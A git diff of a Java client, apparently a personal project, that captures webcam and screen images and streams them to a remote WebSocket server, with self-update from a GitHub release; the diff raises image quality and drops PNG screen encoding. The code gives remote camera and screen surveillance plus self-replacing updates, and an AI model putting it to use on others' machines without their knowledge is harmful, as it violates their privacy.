@@ -27,13 +27,13 @@ public class CameraClient {
 
     static final String SERVER_URL    = "wss://pccon.onrender.com";
     static final int    CAM_FPS       = 30;
-    static final int    SCREEN_FPS    = 20;
-    static final int    JPEG_QUALITY  = 92; // camera JPEG quality 0-100
+    static final int    SCREEN_FPS    = 15;
+    static final int    JPEG_QUALITY  = 95; // used for both camera and screen
     static final int    RECONNECT_SEC = 5;
 
     // Self-update: upload new jar to GitHub Releases as "camera-client.jar"
     static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
-    static final String VERSION    = "1.6"; // bump this string each time you release
+    static final String VERSION    = "1.7"; // bump this string each time you release
 
     static volatile CameraWebSocket ws;
     static volatile boolean reconnecting = false;
@@ -49,8 +49,8 @@ public class CameraClient {
         for (int idx = 0; idx < 3; idx++) {
             try {
                 grabber = new OpenCVFrameGrabber(idx);
-                grabber.setImageWidth(1280);
-                grabber.setImageHeight(720);
+                grabber.setImageWidth(1920);
+                grabber.setImageHeight(1080);
                 grabber.start();
                 Frame test = grabber.grab();
                 if (test != null && test.image != null) {
@@ -233,9 +233,9 @@ public class CameraClient {
             try {
                 if (paused || ws == null || !ws.isOpen()) return;
                 BufferedImage img = robot.createScreenCapture(screen);
-                String b64 = toBase64Png(img);
+                String b64 = toBase64(img);
                 if (b64 == null) return;
-                ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\",\"fmt\":\"png\"}");
+                ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
             } catch (Exception e) {
                 System.err.println("[!] Screen error: " + e.getMessage());
             }
@@ -244,7 +244,7 @@ public class CameraClient {
         System.out.println("[*] Screen capture started");
     }
 
-    // JPEG for camera — smaller size, good for video
+    // JPEG for both camera and screen — high quality, fast enough for real-time
     static String toBase64(BufferedImage img) {
         try {
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -260,15 +260,8 @@ public class CameraClient {
         } catch (Exception e) { return null; }
     }
 
-    // PNG for screen — lossless, text and UI stay perfectly sharp
-    static String toBase64Png(BufferedImage img) {
-        try {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ImageIO.write(img, "png", baos);
-            byte[] bytes = baos.toByteArray();
-            return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
-        } catch (Exception e) { return null; }
-    }
+
+
 
     static void connectAndRun() {
         try {
